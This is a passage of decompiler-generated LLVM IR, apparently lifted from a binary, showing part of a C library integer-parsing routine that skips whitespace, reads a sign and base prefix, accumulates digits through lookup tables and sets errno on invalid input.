  %v3_11390 = load i8, i8* %v2_11390, align 1
  %v4_11390 = zext i8 %v3_11390 to i32
  store i32 %v4_11390, i32* @r5, align 4
  %v6_11390 = add i32 %v3_11384, 1
  store i32 %v6_11390, i32* %r2.global-to-local, align 4
  store i32 %v6_11390, i32* %v2_11384, align 4
  %v0_11374 = load i32, i32* @r5, align 4
  %v7_11378 = icmp eq i32 %v0_11374, 32
  br i1 %v7_11378, label %dec_label_pc_11384.backedge, label %bb

bb:                                               ; preds = %dec_label_pc_11374
  %v1_11374 = add i32 %v0_11374, -9
  %tmp236 = icmp ugt i32 %v1_11374, 4
  br i1 %tmp236, label %dec_label_pc_113b8, label %dec_label_pc_11384.backedge

dec_label_pc_11384.backedge:                      ; preds = %dec_label_pc_1139c, %dec_label_pc_11374, %bb, %bb177
  %v0_11384.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %entry, %dec_label_pc_11384.backedge
  %v2_11394 = phi i32 [ %v0_11384.pre, %dec_label_pc_11384.backedge ], [ %v0_11364, %entry ]
  %v1_11384 = add i32 %v2_11394, 4
  %v2_11384 = inttoptr i32 %v1_11384 to i32*
  %v3_11384 = load i32, i32* %v2_11384, align 4
  store i32 %v3_11384, i32* %r2.global-to-local, align 4
  %v1_11388 = add i32 %v2_11394, 104
  %v2_11388 = inttoptr i32 %v1_11388 to i32*
  %v3_11388 = load i32, i32* %v2_11388, align 4
  %v3_1138c = icmp ult i32 %v3_11384, %v3_11388
  br i1 %v3_1138c, label %dec_label_pc_11374, label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11384
  store i32 %v2_11394, i32* %r0.global-to-local, align 4
  %v1_113a0 = call i32 @__shgetc(i32 %v2_11394)
  store i32 %v1_113a0, i32* %r0.global-to-local, align 4
  store i32 %v1_113a0, i32* @r5, align 4
  %v7_113ac = icmp eq i32 %v1_113a0, 32
  br i1 %v7_113ac, label %dec_label_pc_11384.backedge, label %bb177

bb177:                                            ; preds = %dec_label_pc_1139c
  %v1_113a8 = add i32 %v1_113a0, -9
  %tmp237 = icmp ult i32 %v1_113a8, 5
  br i1 %tmp237, label %dec_label_pc_11384.backedge, label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %bb177, %bb
  %v0_113c824 = phi i32 [ %v1_113a0, %bb177 ], [ %v0_11374, %bb ]
  %v7_113b8 = icmp eq i32 %v0_113c824, 45
  br i1 %v7_113b8, label %dec_label_pc_113d4, label %bb178

bb178:                                            ; preds = %dec_label_pc_113b8
  %v8_113bc = icmp eq i32 %v0_113c824, 43
  br i1 %v8_113bc, label %dec_label_pc_113d4, label %.thread19

.thread19:                                        ; preds = %bb178
  br label %dec_label_pc_113fc

dec_label_pc_113d4:                               ; preds = %bb178, %dec_label_pc_113b8
  %storemerge160 = phi i32 [ 45, %dec_label_pc_113b8 ], [ 43, %bb178 ]
  store i32 %storemerge160, i32* @r4, align 4
  %v0_113d4 = load i32, i32* @sl, align 4
  %v1_113d4 = add i32 %v0_113d4, 4
  %v2_113d4 = inttoptr i32 %v1_113d4 to i32*
  %v3_113d4 = load i32, i32* %v2_113d4, align 4
  store i32 %v3_113d4, i32* %r2.global-to-local, align 4
  %v1_113d8 = add i32 %v0_113d4, 104
  %v2_113d8 = inttoptr i32 %v1_113d8 to i32*
  %v3_113d8 = load i32, i32* %v2_113d8, align 4
  %v3_113dc = icmp ult i32 %v3_113d4, %v3_113d8
  br i1 %v3_113dc, label %.thread27, label %dec_label_pc_118a4

.thread27:                                        ; preds = %dec_label_pc_113d4
  %v2_113e0 = inttoptr i32 %v3_113d4 to i8*
  %v3_113e0 = load i8, i8* %v2_113e0, align 1
  %v4_113e0 = zext i8 %v3_113e0 to i32
  store i32 %v4_113e0, i32* @r5, align 4
  %v6_113e0 = add i32 %v3_113d4, 1
  store i32 %v6_113e0, i32* %r2.global-to-local, align 4
  store i32 %v6_113e0, i32* %v2_113d4, align 4
  br label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %.thread27, %dec_label_pc_118a4
  %v0_113ec = load i32, i32* @r4, align 4
  %v7_113ec = icmp eq i32 %v0_113ec, 45
  br i1 %v7_113ec, label %.thread29, label %bb180

bb180:                                            ; preds = %dec_label_pc_113ec
  br label %dec_label_pc_113fc

.thread29:                                        ; preds = %dec_label_pc_113ec
  br label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %bb180, %.thread29, %.thread19
  %stack_var_-44.1 = phi i32 [ 0, %.thread19 ], [ 0, %bb180 ], [ -1, %.thread29 ]
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v1_11400 = sub i32 1, %tmp
  store i32 %v1_11400, i32* @r4, align 4
  %v2_11400 = icmp ult i32 %tmp, 2
  br i1 %v2_11400, label %bb181, label %.thread139

.thread139:                                       ; preds = %dec_label_pc_113fc
  store i32 0, i32* @r4, align 4
  br label %bb182

bb181:                                            ; preds = %dec_label_pc_113fc
  %v2_11408 = icmp eq i32 %tmp, 0
  br i1 %v2_11408, label %dec_label_pc_114d4, label %bb182

bb182:                                            ; preds = %.thread139, %bb181
  %v0_11420143 = phi i32 [ 0, %.thread139 ], [ %v1_11400, %bb181 ]
  %v8_1140c = icmp eq i32 %tmp, 16
  br i1 %v8_1140c, label %dec_label_pc_114d4, label %.dec_label_pc_11414_crit_edge

.dec_label_pc_11414_crit_edge:                    ; preds = %bb182
  %v0_1141c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %.dec_label_pc_11414_crit_edge, %dec_label_pc_114d4
  %v0_11420142 = phi i32 [ %v0_11420143, %.dec_label_pc_11414_crit_edge ], [ %v0_11420144, %dec_label_pc_114d4 ]
  %v0_1141c = phi i32 [ %v0_1141c.pre, %.dec_label_pc_11414_crit_edge ], [ %v0_114d4, %dec_label_pc_114d4 ]
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_1141c = add i32 %v0_1141c, ptrtoint (i32* @global_var_19dc6.615 to i32)
  %v3_1141c = inttoptr i32 %v2_1141c to i8*
  %v4_1141c = load i8, i8* %v3_1141c, align 1
  %v6_1141c = zext i8 %v4_1141c to i32
  store i32 %v6_1141c, i32* @r2, align 4
  %v2_11420 = icmp eq i32 %v0_11420142, 0
  br i1 %v2_11420, label %bb184, label %bb183

bb183:                                            ; preds = %dec_label_pc_11414
  store i32 10, i32* %r1.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %dec_label_pc_11414, %bb183
  %v0_1142c = phi i32 [ %tmp, %dec_label_pc_11414 ], [ 10, %bb183 ]
  %tmp238 = icmp ugt i32 %v0_1142c, %v6_1141c
  br i1 %tmp238, label %dec_label_pc_11434, label %dec_label_pc_115cc

dec_label_pc_11434:                               ; preds = %bb184, %dec_label_pc_11500
  %v0_1144c = phi i32 [ %v0_1150c, %dec_label_pc_11500 ], [ %v0_1141c, %bb184 ]
  %v0_11444 = phi i32 [ %tmp, %dec_label_pc_11500 ], [ %v0_1142c, %bb184 ]
  %v7_11438 = icmp eq i32 %v0_11444, 10
  br i1 %v7_11438, label %dec_label_pc_1159c.preheader, label %dec_label_pc_11444

dec_label_pc_1159c.preheader:                     ; preds = %dec_label_pc_11434
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1159c

dec_label_pc_11444:                               ; preds = %dec_label_pc_11434
  %v1_11450 = add i32 %v0_1144c, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11450 = inttoptr i32 %v1_11450 to i8*
  %v3_11450 = load i8, i8* %v2_11450, align 1
  %v4_11450 = zext i8 %v3_11450 to i32
  store i32 %v4_11450, i32* %fp.global-to-local, align 4
  store i32 %v0_11444, i32* %r2.global-to-local, align 4
  %v1_11458 = add i32 %v0_11444, -1
  br label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %.thread156, %dec_label_pc_11508, %dec_label_pc_11444
  %v4_11558107 = phi i32 [ %v4_11450, %dec_label_pc_11444 ], [ %v4_11510, %dec_label_pc_11508 ], [ %v6_11a48, %.thread156 ]
  %v1_1145c = phi i32 [ %v0_11444, %dec_label_pc_11444 ], [ 8, %dec_label_pc_11508 ], [ 16, %.thread156 ]
  %v0_1145c = phi i32 [ %v1_11458, %dec_label_pc_11444 ], [ 7, %dec_label_pc_11508 ], [ 15, %.thread156 ]
  %v2_1145c = and i32 %v0_1145c, %v1_1145c
  store i32 %v2_1145c, i32* %r1.global-to-local, align 4
  %v4_1145c = icmp eq i32 %v2_1145c, 0
  br i1 %v4_1145c, label %dec_label_pc_1146c, label %dec_label_pc_11548.preheader

dec_label_pc_11548.preheader:                     ; preds = %dec_label_pc_1145c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11548

dec_label_pc_1146c:                               ; preds = %dec_label_pc_1145c
  %v2_11474 = mul i32 %v1_1145c, 23
  %v3_11478 = udiv i32 %v2_11474, 32
  store i32 ptrtoint (i32* @global_var_19dbc.619 to i32), i32* %r2.global-to-local, align 4
  %v1_11480 = urem i32 %v3_11478, 8
  %v2_11484 = add i32 %v1_11480, ptrtoint (i32* @global_var_19dbc.619 to i32)
  %v3_11484 = inttoptr i32 %v2_11484 to i8*
  %v4_11484 = load i8, i8* %v3_11484, align 1
  %v6_11484 = zext i8 %v4_11484 to i32
  store i32 %v6_11484, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_114a0

dec_label_pc_11490:                               ; preds = %.thread34.dec_label_pc_11490_crit_edge, %dec_label_pc_114c8
  %v0_11494 = phi i32 [ %v0_11494.pre, %.thread34.dec_label_pc_11490_crit_edge ], [ %v1_114cc, %dec_label_pc_114c8 ]
  %v0_11498 = load i32, i32* %fp.global-to-local, align 4
  %v1_11498 = load i32, i32* @r4, align 4
  %v2_11498 = load i32, i32* @r5, align 4
  %v7_11498 = shl i32 %v1_11498, %v2_11498
  %v8_11498 = or i32 %v7_11498, %v0_11498
  store i32 %v8_11498, i32* @r4, align 4
  %v1_1149c = add i32 %v0_11494, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_1149c = inttoptr i32 %v1_1149c to i8*
  %v3_1149c = load i8, i8* %v2_1149c, align 1
  %v4_1149c = zext i8 %v3_1149c to i32
  store i32 %v4_1149c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_114a0

dec_label_pc_114a0:                               ; preds = %dec_label_pc_1146c, %dec_label_pc_11490
  %v0_116a8122 = phi i32 [ %v6_11484, %dec_label_pc_1146c ], [ %v2_11498, %dec_label_pc_11490 ]
  %v4_114a8 = phi i32 [ %v4_11558107, %dec_label_pc_1146c ], [ %v4_1149c, %dec_label_pc_11490 ]
  %v0_11648 = phi i32 [ 0, %dec_label_pc_1146c ], [ %v8_11498, %dec_label_pc_11490 ]
  store i32 %v1_1145c, i32* %r1.global-to-local, align 4
  %v2_114a4 = icmp ugt i32 %v0_11648, 134217726
  %v8_114a4 = icmp eq i32 %v0_11648, 134217727
  %v2_114a8 = xor i1 %v2_114a4, true
  %v3_114a8 = or i1 %v8_114a4, %v2_114a8
  br i1 %v3_114a8, label %bb186, label %bb187

bb186:                                            ; preds = %dec_label_pc_114a0
  %v7_114a8 = icmp ult i32 %v4_114a8, %v1_1145c
  br i1 %v7_114a8, label %dec_label_pc_114b0, label %dec_label_pc_116a0

bb187:                                            ; preds = %dec_label_pc_114a0
  br i1 %v2_114a4, label %dec_label_pc_116a0, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %bb186, %bb187
  %v0_114b0 = load i32, i32* @sl, align 4
  %v1_114b0 = add i32 %v0_114b0, 4
  %v2_114b0 = inttoptr i32 %v1_114b0 to i32*
  %v3_114b0 = load i32, i32* %v2_114b0, align 4
  store i32 %v3_114b0, i32* %r2.global-to-local, align 4
  %v1_114b4 = add i32 %v0_114b0, 104
  %v2_114b4 = inttoptr i32 %v1_114b4 to i32*
  %v3_114b4 = load i32, i32* %v2_114b4, align 4
  %v3_114b8 = icmp ult i32 %v3_114b0, %v3_114b4
  br i1 %v3_114b8, label %.thread34.dec_label_pc_11490_crit_edge, label %dec_label_pc_114c8

.thread34.dec_label_pc_11490_crit_edge:           ; preds = %dec_label_pc_114b0
  %v2_114bc = inttoptr i32 %v3_114b0 to i8*
  %v3_114bc = load i8, i8* %v2_114bc, align 1
  %v4_114bc = zext i8 %v3_114bc to i32
  store i32 %v4_114bc, i32* %r0.global-to-local, align 4
  %v6_114bc = add i32 %v3_114b0, 1
  store i32 %v6_114bc, i32* %r2.global-to-local, align 4
  store i32 %v6_114bc, i32* %v2_114b0, align 4
  %v0_11494.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11490

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114b0
  store i32 %v0_114b0, i32* %r0.global-to-local, align 4
  %v1_114cc = call i32 @__shgetc(i32 %v0_114b0)
  store i32 %v1_114cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11490

dec_label_pc_114d4:                               ; preds = %bb181, %bb182
  %v0_11420144 = phi i32 [ %v1_11400, %bb181 ], [ %v0_11420143, %bb182 ]
  %v0_114d4 = load i32, i32* @r5, align 4
  %v7_114d4 = icmp eq i32 %v0_114d4, 48
  br i1 %v7_114d4, label %dec_label_pc_114dc, label %dec_label_pc_11414

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114d4
  %v0_114dc = load i32, i32* @sl, align 4
  %v1_114dc = add i32 %v0_114dc, 4
  %v2_114dc = inttoptr i32 %v1_114dc to i32*
  %v3_114dc = load i32, i32* %v2_114dc, align 4
  store i32 %v3_114dc, i32* %r2.global-to-local, align 4
  %v1_114e0 = add i32 %v0_114dc, 104
  %v2_114e0 = inttoptr i32 %v1_114e0 to i32*
  %v3_114e0 = load i32, i32* %v2_114e0, align 4
  %v3_114e4 = icmp ult i32 %v3_114dc, %v3_114e0
  br i1 %v3_114e4, label %.thread36.dec_label_pc_114f4_crit_edge, label %dec_label_pc_11a1c

.thread36.dec_label_pc_114f4_crit_edge:           ; preds = %dec_label_pc_114dc
  %v2_114e8 = inttoptr i32 %v3_114dc to i8*
  %v3_114e8 = load i8, i8* %v2_114e8, align 1
  %v4_114e8 = zext i8 %v3_114e8 to i32
  store i32 %v4_114e8, i32* @r5, align 4
  %v6_114e8 = add i32 %v3_114dc, 1
  store i32 %v6_114e8, i32* @r2, align 4
  store i32 %v6_114e8, i32* %v2_114dc, align 4
  %v0_114f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_114f4

dec_label_pc_114f4:                               ; preds = %.thread36.dec_label_pc_114f4_crit_edge, %dec_label_pc_11a1c
  %v0_1150c = phi i32 [ %v0_114f4.pre, %.thread36.dec_label_pc_114f4_crit_edge ], [ %v1_11a20, %dec_label_pc_11a1c ]
  %v1_114f4 = or i32 %v0_1150c, 32
  %v7_114f8 = icmp eq i32 %v1_114f4, 120
  br i1 %v7_114f8, label %dec_label_pc_11a2c, label %dec_label_pc_11500

dec_label_pc_11500:                               ; preds = %dec_label_pc_114f4
  %v0_11500 = load i32, i32* @r4, align 4
  %v2_11500 = icmp eq i32 %v0_11500, 0
  br i1 %v2_11500, label %dec_label_pc_11434, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11500
  %v1_11510 = add i32 %v0_1150c, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11510 = inttoptr i32 %v1_11510 to i8*
  %v3_11510 = load i8, i8* %v2_11510, align 1
  %v4_11510 = zext i8 %v3_11510 to i32
  store i32 %v4_11510, i32* %fp.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1145c

dec_label_pc_11530:                               ; preds = %.thread38.dec_label_pc_11530_crit_edge, %dec_label_pc_11578
  %v0_11538 = phi i32 [ %v0_11538.pre, %.thread38.dec_label_pc_11530_crit_edge ], [ %v1_1152c, %dec_label_pc_11578 ]
  store i32 %v1_1145c, i32* %r1.global-to-local, align 4
  %v1_1153c = load i32, i32* @r4, align 4
  %v2_1153c = load i32, i32* %fp.global-to-local, align 4
  %v3_1153c = mul i32 %v1_1153c, %v1_1145c
  %v4_1153c = add i32 %v2_1153c, %v3_1153c
  store i32 %v4_1153c, i32* @r4, align 4
  %v1_11540 = add i32 %v0_11538, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11540 = inttoptr i32 %v1_11540 to i8*
  %v3_11540 = load i8, i8* %v2_11540, align 1
  %v4_11540 = zext i8 %v3_11540 to i32
  store i32 %v4_11540, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_11548.preheader, %dec_label_pc_11530
  %v0_1181460 = phi i32 [ %v4_11558107, %dec_label_pc_11548.preheader ], [ %v4_11540, %dec_label_pc_11530 ]
  %v0_117f0 = phi i32 [ 0, %dec_label_pc_11548.preheader ], [ %v4_1153c, %dec_label_pc_11530 ]
  store i32 %v1_1145c, i32* %r2.global-to-local, align 4
  %v3_11554 = icmp ugt i32 %v0_117f0, 119304645
  %v9_11554 = icmp eq i32 %v0_117f0, 119304646
  %v2_11558 = xor i1 %v3_11554, true
  %v3_11558 = or i1 %v9_11554, %v2_11558
  br i1 %v3_11558, label %bb189, label %bb190

bb189:                                            ; preds = %dec_label_pc_11548
  %v7_11558 = icmp ult i32 %v0_1181460, %v1_1145c
  br i1 %v7_11558, label %dec_label_pc_11560, label %dec_label_pc_117f0

bb190:                                            ; preds = %dec_label_pc_11548
  br i1 %v3_11554, label %.dec_label_pc_117f0_crit_edge, label %dec_label_pc_11560

.dec_label_pc_117f0_crit_edge:                    ; preds = %bb190
  br label %dec_label_pc_117f0

dec_label_pc_11560:                               ; preds = %bb189, %bb190
  %v0_11560 = load i32, i32* @sl, align 4
  %v1_11560 = add i32 %v0_11560, 4
  %v2_11560 = inttoptr i32 %v1_11560 to i32*
  %v3_11560 = load i32, i32* %v2_11560, align 4
  store i32 %v3_11560, i32* %r2.global-to-local, align 4
  %v1_11564 = add i32 %v0_11560, 104
  %v2_11564 = inttoptr i32 %v1_11564 to i32*
  %v3_11564 = load i32, i32* %v2_11564, align 4
  %v3_11568 = icmp ult i32 %v3_11560, %v3_11564
  br i1 %v3_11568, label %.thread38.dec_label_pc_11530_crit_edge, label %dec_label_pc_11578

.thread38.dec_label_pc_11530_crit_edge:           ; preds = %dec_label_pc_11560
  %v2_1156c = inttoptr i32 %v3_11560 to i8*
  %v3_1156c = load i8, i8* %v2_1156c, align 1
  %v4_1156c = zext i8 %v3_1156c to i32
  store i32 %v4_1156c, i32* %r0.global-to-local, align 4
  %v6_1156c = add i32 %v3_11560, 1
  store i32 %v6_1156c, i32* %r2.global-to-local, align 4
  store i32 %v6_1156c, i32* %v2_11560, align 4
  %v0_11538.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11530

dec_label_pc_11578:                               ; preds = %dec_label_pc_11560
  store i32 %v0_11560, i32* %r0.global-to-local, align 4
  %v1_1152c = call i32 @__shgetc(i32 %v0_11560)
  store i32 %v1_1152c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11530

dec_label_pc_11584:                               ; preds = %.thread40.dec_label_pc_11584_crit_edge, %dec_label_pc_115c8
  %v0_11598 = phi i32 [ %v0_11598.pre, %.thread40.dec_label_pc_11584_crit_edge ], [ %v1_11580, %dec_label_pc_115c8 ]
  %v0_11584 = load i32, i32* @r4, align 4
  %v3_11584 = mul i32 %v0_11584, 8
  store i32 %v3_11584, i32* @r2, align 4
  %v2_1158c = mul i32 %v0_11584, 10
  %v1_11590 = load i32, i32* @r5, align 4
  %v2_11590 = add i32 %v1_11590, %v2_1158c
  %v1_11594 = add i32 %v2_11590, -48
  store i32 %v1_11594, i32* @r4, align 4
  store i32 %v0_11598, i32* @r5, align 4
  br label %dec_label_pc_1159c

dec_label_pc_1159c:                               ; preds = %dec_label_pc_1159c.preheader, %dec_label_pc_11584
  %v0_118b4 = phi i32 [ 0, %dec_label_pc_1159c.preheader ], [ %v1_11594, %dec_label_pc_11584 ]
  %v0_115a0 = phi i32 [ %v0_1144c, %dec_label_pc_1159c.preheader ], [ %v0_11598, %dec_label_pc_11584 ]
  %v1_115a0 = add i32 %v0_115a0, -48
  store i32 %v1_115a0, i32* %r0.global-to-local, align 4
  %v2_115a4 = icmp ugt i32 %v1_115a0, 8
  %v7_115a4 = icmp eq i32 %v1_115a0, 9
  %v2_115a8 = xor i1 %v2_115a4, true
  %v3_115a8 = or i1 %v7_115a4, %v2_115a8
  br i1 %v3_115a8, label %bb191, label %bb193

bb191:                                            ; preds = %dec_label_pc_1159c
  %v7_115a8 = icmp ugt i32 %v0_118b4, 429496727
  %v13_115a8 = icmp eq i32 %v0_118b4, 429496728
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_1159c, %bb191
  %v1_115ac = phi i1 [ false, %dec_label_pc_1159c ], [ %v13_115a8, %bb191 ]
  %v0_115ac = phi i1 [ %v2_115a4, %dec_label_pc_1159c ], [ %v7_115a8, %bb191 ]
  %v2_115ac = xor i1 %v1_115ac, true
  %v3_115ac = and i1 %v0_115ac, %v2_115ac
  br i1 %v3_115ac, label %dec_label_pc_118b4, label %dec_label_pc_115b0

dec_label_pc_115b0:                               ; preds = %bb193
  %v0_115b0 = load i32, i32* @sl, align 4
  %v1_115b0 = add i32 %v0_115b0, 4
  %v2_115b0 = inttoptr i32 %v1_115b0 to i32*
  %v3_115b0 = load i32, i32* %v2_115b0, align 4
  store i32 %v3_115b0, i32* %r2.global-to-local, align 4
  %v1_115b4 = add i32 %v0_115b0, 104
  %v2_115b4 = inttoptr i32 %v1_115b4 to i32*
  %v3_115b4 = load i32, i32* %v2_115b4, align 4
  %v3_115b8 = icmp ult i32 %v3_115b0, %v3_115b4
  br i1 %v3_115b8, label %.thread40.dec_label_pc_11584_crit_edge, label %dec_label_pc_115c8

.thread40.dec_label_pc_11584_crit_edge:           ; preds = %dec_label_pc_115b0
  %v2_115bc = inttoptr i32 %v3_115b0 to i8*
  %v3_115bc = load i8, i8* %v2_115bc, align 1
  %v4_115bc = zext i8 %v3_115bc to i32
  store i32 %v4_115bc, i32* %r0.global-to-local, align 4
  %v6_115bc = add i32 %v3_115b0, 1
  store i32 %v6_115bc, i32* %r2.global-to-local, align 4
  store i32 %v6_115bc, i32* %v2_115b0, align 4
  %v0_11598.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11584

dec_label_pc_115c8:                               ; preds = %dec_label_pc_115b0
  store i32 %v0_115b0, i32* %r0.global-to-local, align 4
  %v1_11580 = call i32 @__shgetc(i32 %v0_115b0)
  store i32 %v1_11580, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11584

dec_label_pc_115cc:                               ; preds = %bb184
  %v0_115cc = load i32, i32* @sl, align 4
  %v1_115cc = add i32 %v0_115cc, 104
  %v2_115cc = inttoptr i32 %v1_115cc to i32*
  %v3_115cc = load i32, i32* %v2_115cc, align 4
  %v2_115d0 = icmp eq i32 %v3_115cc, 0
  br i1 %v2_115d0, label %.thread43, label %bb194

bb194:                                            ; preds = %dec_label_pc_115cc
  %v2_115d4 = add i32 %v0_115cc, 4
  %v3_115d4 = inttoptr i32 %v2_115d4 to i32*
  %v4_115d4 = load i32, i32* %v3_115d4, align 4
  %v2_115d8 = add i32 %v4_115d4, -1
  store i32 %v2_115d8, i32* %v3_115d4, align 4
  %v0_115e8.pre = load i32, i32* @sl, align 4
  %v1_115ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_115cc, %bb194
  %v1_115ec = phi i32 [ %v0_1142c, %dec_label_pc_115cc ], [ %v1_115ec.pre, %bb194 ]
  %v0_115e8 = phi i32 [ %v0_115cc, %dec_label_pc_115cc ], [ %v0_115e8.pre, %bb194 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_115e8, i32* %r0.global-to-local, align 4
  %v7_115ec = call i32 @__shlim(i32 %v0_115e8, i32 %v1_115ec, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_115ec, i32* %r0.global-to-local, align 4
  %v0_115f0 = call i32 @__errno_location()
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %stack_var_0, align 4
  store i32 22, i32* @r3, align 4
  %v2_11608 = inttoptr i32 %v0_115f0 to i32*
  store i32 22, i32* %v2_11608, align 4
  %v2_11610 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_11610, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_11ae4, %dec_label_pc_11ab8, %dec_label_pc_11a84, %dec_label_pc_119c4, %dec_label_pc_117b4, %dec_label_pc_11750, %dec_label_pc_11620, %.thread43
  %v1_1161c = phi i32 [ 0, %dec_label_pc_11ae4 ], [ 0, %dec_label_pc_11ab8 ], [ %v1_1161c.pre, %dec_label_pc_11a84 ], [ %v2_119f4, %dec_label_pc_119c4 ], [ %v2_117c8, %dec_label_pc_117b4 ], [ %v2_11760, %dec_label_pc_11750 ], [ %v0_1163c, %dec_label_pc_11620 ], [ %v2_11610, %.thread43 ]
  store i32 %v6_11354, i32* @r5, align 4
  store i32 %v12_11354, i32* @r7, align 4
  store i32 %v15_11354, i32* @r8, align 4
  store i32 %v18_11354, i32* @sb, align 4
  store i32 %v21_11354, i32* @sl, align 4
  ret i32 %v1_1161c

dec_label_pc_11620:                               ; preds = %entry
  %v0_11620 = call i32 @__errno_location()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 22, i32* @r3, align 4
  store i32 0, i32* %stack_var_0, align 4
  %v2_11638 = inttoptr i32 %v0_11620 to i32*
  store i32 22, i32* %v2_11638, align 4
  %v0_1163c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1163c, i32* %r0.global-to-local, align 4
  %v0_11640 = load i32, i32* @r2, align 4
  store i32 %v0_11640, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_11654:                               ; preds = %bb198
  %v9_116cc = icmp eq i32 %v0_116cc, %v6_116b8
  br i1 %v9_116cc, label %dec_label_pc_117e4, label %dec_label_pc_11658

dec_label_pc_11658:                               ; preds = %dec_label_pc_117e4, %dec_label_pc_11654
  %v0_11658 = load i32, i32* @sl, align 4
  %v1_11658 = add i32 %v0_11658, 4
  %v2_11658 = inttoptr i32 %v1_11658 to i32*
  %v3_11658 = load i32, i32* %v2_11658, align 4
  store i32 %v3_11658, i32* %r2.global-to-local, align 4
  %v1_1165c = add i32 %v0_11658, 104
  %v2_1165c = inttoptr i32 %v1_1165c to i32*
  %v3_1165c = load i32, i32* %v2_1165c, align 4
  %v3_11660 = icmp ult i32 %v3_11658, %v3_1165c
  br i1 %v3_11660, label %.thread44, label %dec_label_pc_117a4

.thread44:                                        ; preds = %dec_label_pc_11658
  %v2_11664 = inttoptr i32 %v3_11658 to i8*
  %v3_11664 = load i8, i8* %v2_11664, align 1
  %v4_11664 = zext i8 %v3_11664 to i32
  store i32 %v4_11664, i32* %r0.global-to-local, align 4
  %v6_11664 = add i32 %v3_11658, 1
  store i32 %v6_11664, i32* %r2.global-to-local, align 4
  store i32 %v6_11664, i32* %v2_11658, align 4
  br label %dec_label_pc_11670

dec_label_pc_11670:                               ; preds = %.thread44, %dec_label_pc_117a4
  %v0_11670 = load i32, i32* @r7, align 4
  %v1_11670 = load i32, i32* @r5, align 4
  %v6_11670 = shl i32 %v0_11670, %v1_11670
  %v0_11674 = load i32, i32* @r8, align 4
  %v1_11674 = icmp slt i32 %v0_11674, 0
  %v1_11678 = load i32, i32* @r6, align 4
  %v2_11678 = load i32, i32* @sb, align 4
  %v7_11678 = lshr i32 %v1_11678, %v2_11678
  %v8_11678 = or i32 %v7_11678, %v6_11670
  %v6_1167c = shl i32 %v1_11678, %v1_11670
  br i1 %v1_11674, label %bb196, label %bb195

bb195:                                            ; preds = %dec_label_pc_11670
  %v9_11680 = shl i32 %v1_11678, %v0_11674
  br label %bb196

bb196:                                            ; preds = %dec_label_pc_11670, %bb195
  %storemerge234 = phi i32 [ %v9_11680, %bb195 ], [ %v8_11678, %dec_label_pc_11670 ]
  %v1_1169c = phi i32 [ %v9_11680, %bb195 ], [ %v8_11678, %dec_label_pc_11670 ]
  store i32 %storemerge234, i32* @r4, align 4
  %v0_11688 = load i32, i32* %r0.global-to-local, align 4
  %v2_11688 = add i32 %v0_11688, ptrtoint (i32* @global_var_19dc5.617 to i32)
  store i32 %v2_11688, i32* %r2.global-to-local, align 4
  %v0_1168c = load i32, i32* %fp.global-to-local, align 4
  %v1_1168c = urem i32 %v0_1168c, 256
  store i32 %v1_1168c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_11694 = add i32 %v0_11688, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11694 = inttoptr i32 %v1_11694 to i8*
  %v3_11694 = load i8, i8* %v2_11694, align 1
  %v4_11694 = zext i8 %v3_11694 to i32
  store i32 %v4_11694, i32* %fp.global-to-local, align 4
  %v2_11698 = or i32 %v1_1168c, %v6_1167c
  br label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %bb186, %bb187, %bb196
  %storemerge = phi i32 [ %v2_11698, %bb196 ], [ %v0_11648, %bb186 ], [ %v0_11648, %bb187 ]
